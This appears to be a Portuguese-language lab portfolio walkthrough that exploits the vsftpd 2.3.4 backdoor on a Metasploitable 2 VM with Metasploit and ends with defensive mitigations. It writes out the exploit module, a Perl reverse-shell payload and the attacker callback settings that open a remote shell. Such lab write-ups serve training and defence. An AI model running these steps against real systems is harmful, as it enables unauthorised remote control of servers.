PROJETO DE ESTUDO & PORTFÓLIO

Simulação de Invasão:
Vulnerabilidade vsftpd 2.3.4

Laboratório Prático de Cibersegurança em Ambiente Controlado

Demonstração prática do ciclo de invasão em serviço FTP, desde a identificação do alvo até a obtenção de acesso remoto (Reverse Shell), com explicações didáticas linha a linha.

ARQUITETURA & AMBIENTE

Visão Geral e Arquitetura do Laboratório

  • ▶ Ambiente Controlado: Testes executados em rede interna virtualizada e isolada no Oracle VM VirtualBox, sem conexão com redes externas.
  • ▶ Máquina Atacante: Kali Linux (IP 192.168.18.110), configurado no padrão de teclado ABNT2 (setxkbmap -model abnt2 -layout br).
  • ▶ Máquina Alvo: Metasploitable 2 (IP 192.168.18.114), sistema Linux propositalmente vulnerável para treinamento e estudos.
  • ▶ Vulnerabilidade Explorada: CVE-2011-2523 (Backdoor histórico no serviço FTP vsftpd 2.3.4 acionado ao inserir um smiley :)).
  • ▶ Aviso Ético: Conteúdo realizado exclusivamente para aprendizado e fortalecimento da segurança defensiva.
PASSO 01 • METASPLOITABLE 2 (ALVO)

Passo 1: Acesso Inicial à Máquina Alvo

Comando / Credenciais:
login: msfadmin password: msfadmin

O que cada linha faz:

  • Inicialização do servidor de laboratório Metasploitable 2 no VirtualBox.
  • Autenticação com as credenciais padrão de treinamento (usuário msfadmin e senha msfadmin).
  • Garante que a máquina vítima está ativa e com os serviços de rede iniciados.
PASSO 02 • METASPLOITABLE 2 (ALVO)

Passo 2: Criação da Flag (Prova de Conceito)

Comando Executado:
echo flag.txt > flag.txt

O que cada linha faz:

  • echo flag.txt: Imprime o texto "flag.txt" na saída do console.
  • >: Operador de redirecionamento que grava a saída em um novo arquivo em vez de apenas mostrar na tela.
  • flag.txt: Nome do arquivo criado. Em segurança, a "flag" atua como evidência de que conseguimos ler/alterar arquivos no alvo após a invasão.
PASSO 03 • METASPLOITABLE 2 (ALVO)

Passo 3: Verificação da Existência da Flag

Comando Executado:
ls

O que cada linha faz:

  • ls (list): Lista os arquivos e pastas presentes no diretório atual.
  • Confirmamos visualmente a presença do arquivo flag.txt recém-criado.
  • Identificamos também a pasta vulnerable já presente no sistema.
PASSO 04 • RECONHECIMENTO DE REDE

Passo 4: Identificação do Endereço IP do Alvo

Comando Executado:
ip a

O que cada linha faz:

  • ip a (ip address): Exibe todas as placas de rede do computador e seus IPs.
  • Na interface eth0, encontramos o endereço IP 192.168.18.114/24.
  • Esse endereço é essencial: é ele que definiremos como alvo (RHOSTS) no Kali Linux.
PASSO 05 • KALI LINUX (ATACANTE)

Passo 5: Inicialização do Metasploit no Kali Linux

Comando Executado:
msfconsole

O que cada linha faz:

  • msfconsole: Abre a interface interativa do Metasploit Framework.
  • É a ferramenta padrão de mercado para testes de intrusão e validação de vulnerabilidades.
  • Nota ABNT2: Kali configurado com layout ABNT2 para facilitar digitação de barras, interrogações e caminhos de exploits.
PASSO 06 • KALI LINUX (EXPLOIT)

Passo 6: Seleção do Exploit e Definição do Alvo

Comandos Executados:
use exploit/unix/ftp/vsftpd_234_backdoor set rhosts 192.168.18.114

O que cada linha faz:

  • use exploit/...: Carrega o exploit que aproveita o backdoor do vsftpd 2.3.4 na porta 21 (FTP).
  • set rhosts 192.168.18.114: Remote Hosts: informa ao Metasploit o endereço IP da máquina que será atacada.
PASSO 07 • KALI LINUX (PAYLOADS)

Passo 7: Listagem dos Payloads Compatíveis

Comando Executado:
show payloads

O que cada linha faz:

  • show payloads: Exibe todas as opções de cargas úteis compatíveis com este exploit.
  • Um payload é o código executado na máquina vítima após a invasão (ex: criar um usuário, abrir um terminal remoto).
PASSO 08 • KALI LINUX (PAYLOAD)

Passo 8: Seleção do Payload Perl Reverso

Payload Selecionado (Linha 538):
payload/cmd/unix/reverse_perl

O que cada linha faz:

  • Selecionamos o payload em Perl para abrir um terminal reverso.
  • Uma conexão reversa parte da máquina vítima em direção à máquina atacante, contornando a maioria das regras padrão de firewall de entrada.
PASSO 09 • EXECUÇÃO DO ATAQUE

Passo 9: Configuração do LHOST e Disparo do Exploit

Comandos Executados:
set payload payload/cmd/unix/reverse_perl set lhost 192.168.18.110 exploit

O que cada linha faz:

  • set payload ...: Aplica o payload Perl ao módulo.
  • set lhost 192.168.18.110: Local Host: IP do Kali para receber a conexão reversa.
  • exploit: Dispara o ataque. Metasploit confirma: Command shell session 1 opened!
PASSO 10 • ACESSO CONFIRMADO

Passo 10: Sucesso da Invasão e Validação da Sessão

Comando Executado (Dentro da Sessão):
ip a

O que cada linha faz:

  • Executamos ip a remotamente dentro da sessão de terminal aberta no alvo.
  • O resultado exibe o IP 192.168.18.114 da máquina Metasploitable.
  • Comprova sem dúvidas o controle total de comandos na máquina vítima direto pelo Kali!
SEGURANÇA DEFENSIVA (BLUE TEAM)

Como Prevenir e Mitigar essa Falha

  • 🛡️ Atualização Imediata: Versões desatualizadas como o vsftpd 2.3.4 devem ser atualizadas para versões seguras e suportadas.
  • 🛡️ Desativação de Protocolos Inseguros: Evitar o FTP comum (texto claro) e adotar SFTP (SSH File Transfer Protocol) ou FTPS (FTP sobre TLS).
  • 🛡️ Firewall e Segmentação de Rede: Bloquear portas não utilizadas e restringir o tráfego de saída do servidor para portas autorizadas.
  • 🛡️ Monitoramento e IDS/IPS: Utilizar ferramentas como Snort ou Suricata para alertar conexões maliciosas com padrões de exploits.
  • 🛡️ Menor Privilégio: Nunca executar daemons de rede com permissões de administrador (root).
